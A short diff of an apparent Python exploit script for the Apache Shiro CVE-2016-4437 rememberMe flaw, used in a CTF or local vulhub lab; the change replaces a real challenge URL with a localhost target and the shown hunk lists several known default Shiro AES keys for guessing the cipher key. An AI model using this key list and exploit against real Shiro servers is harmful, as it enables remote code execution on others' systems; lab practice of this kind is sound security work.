@@ -3,7 +3,8 @@ import base64, os, time, urllib.request
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
-TARGET = "http://node4.anna.nssctf.cn:20975/web/"
+# 目标改成你自己的靶机地址再跑（原真实靶机 URL 已于 2026-09-08 清理，避免外部目标长期留存）
+TARGET = "http://127.0.0.1:8100/web/"   # vulhub Shiro CVE-2016-4437 本地靶
 KEYS = [
     "kPH+bIxk5D2deZiIxcaaaA==", "4AvVhmFLUs0KTA3Kprsdag==", "Z3VucwAAAAAAAAAAAAAAAA==",
     "fCq+/xW488hMTCD+cmJ3aQ==", "0AvVhmFLUs0KTA3Kprsdag==", "1QWLxg+NYmxraMoxAXu/Iw==",
